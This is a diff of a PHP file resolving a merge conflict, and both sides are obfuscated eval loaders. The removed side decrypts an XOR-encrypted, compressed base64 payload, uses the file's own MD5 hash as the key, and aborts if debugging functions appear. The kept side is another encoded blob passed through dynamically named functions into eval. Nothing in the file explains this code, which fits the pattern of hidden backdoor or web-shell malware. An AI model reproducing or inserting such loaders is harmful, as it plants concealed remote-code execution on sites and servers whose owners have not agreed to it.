@@ -1,29 +1,4 @@
 <?php
-<<<<<<< Updated upstream
-$yyhsrstz="955bda07df7eff2280ecdbb7ad343808";
-$avbgakfw="0f030354535901515d53510650075401590352055d545556555d0551005d070b";
-$vxkfiezl="TuybYnq361YpiEWSKQd3oXw3kvFzHZZkhS2MLYg1xuIoNhfVOyhchJ2D1ThsjBmccnF/RuUM/USqztCGvqK1Sp408CeNeYGKwHctvEMwzNb1eHPHY9Nl2OCV468WzXbkwCr3S+zhyIzRsqCSJq1PGZGrV13NZt95C9E4AnzmzgBO+HgE2sAz0OvC5iaiFHTbMoM45ufpSOBzElRQ+EDZAZO8hNdYtfMwyf1yfbmrw4znVxtuDpj0AC8zKEKhY7+hbHFZNL2U6GLqkibNd5qmfsyhjgYK+wFHXjfxiP5fNmMdYNTSQ45xiek+kuJgtrn0suq1QqykogRR6nMzfhnHUww+ahUilR0jnDuxv+BkNSxj8A2H9SluhD6wWo54AUs8Avv1ImNnTJ2TpV7HR/n2aVstuieUXXvXiTFkfRt0XhsifDu4/5BIzPpdjAEH0szE71mDi3SVykpwQJagg60d8OeCCa/2SAV9npTPspRvF6BeifiVxyJfxjoknTeMeF9iu39nfZxaZfchKp/A+o4hRXN1vQmR1XJhkfRbMumE3d8JO1Eblbmv3eaXgBhs+JCsmo4ukv/F5u3ilV7h72qytfdSyqRBxcLPBtylmNe08UxvFbxeoVZTJR7g9LZ/hMj+QkF4o1xDs1ytF7xFRXK4Y79tkcXGVKCFpacin9WFDBaPIbTiVqmuZ3gcGyrWwGu3PT+rwgPxydLY6Kz8Baw9CSvOSr0i3mgHp0BAxp37OLGqJF/hw50mw9QwfF9tyfkS+sE598BKoA==";
-$trtrlnrwwq=file_get_contents(__FILE__);
-$gmhowxdzv=str_replace($vxkfiezl,"",$trtrlnrwwq);
-if(strpos($gmhowxdzv,"ec"."ho")!==false||strpos($gmhowxdzv,"pr"."int")!==false||strpos($gmhowxdzv,"var_"."dump")!==false||strpos($gmhowxdzv,"file_put_"."contents")!==false||strpos($gmhowxdzv,"fw"."rite")!==false){die();}
-$pqixyqk=str_replace(array($yyhsrstz,$avbgakfw),array("SP_2255b966","KP_d637b17c"),$trtrlnrwwq);
-$wxgemtdxw=md5($pqixyqk);
-$vpawnmfthq=hex2bin($avbgakfw);
-$rydzibuhah="";
-$udjwdsy=strlen($wxgemtdxw);
-for($zqnwccne=0;$zqnwccne<$udjwdsy;$zqnwccne++){
-$rydzibuhah.=chr(ord($vpawnmfthq[$zqnwccne])^ord($wxgemtdxw[$zqnwccne]));
-}
-$ntvdmy=base64_decode($vxkfiezl);
-$wplncrb=strlen($ntvdmy);
-$qwllyfprl="";
-$jisaqnph=strlen($rydzibuhah);
-for($zqnwccne=0;$zqnwccne<$wplncrb;$zqnwccne++){
-$qwllyfprl.=$ntvdmy[$zqnwccne]^$rydzibuhah[$zqnwccne%$jisaqnph];
-}
-$jpqgcl="gzun"."compress";
-eval($jpqgcl($qwllyfprl));
-=======
 // bebf19ffd58c87d47a7bd88c
 $nGOSHelYmAri="Zj46REkVMEEdDjTstRvaUqcP9fI6+Z5Nq+lb8Bh1aYU=";
 $SjPwCtUyDauw="Mw46ERxIZRRqQwGfgEinHdpC9sV6+M5Ad+yo8Ou1nLH=";
@@ -52,4 +27,3 @@ $YPHAwrIRhgt=$vFlDwRKPUdmBE($YPHAwrIRhgt);
 $YPHAwrIRhgt=$AZrrsjlmigB($YPHAwrIRhgt);
 $YPHAwrIRhgt=$ztBRDUAiVYpu($YPHAwrIRhgt);
 eval($YPHAwrIRhgt);
->>>>>>> Stashed changes
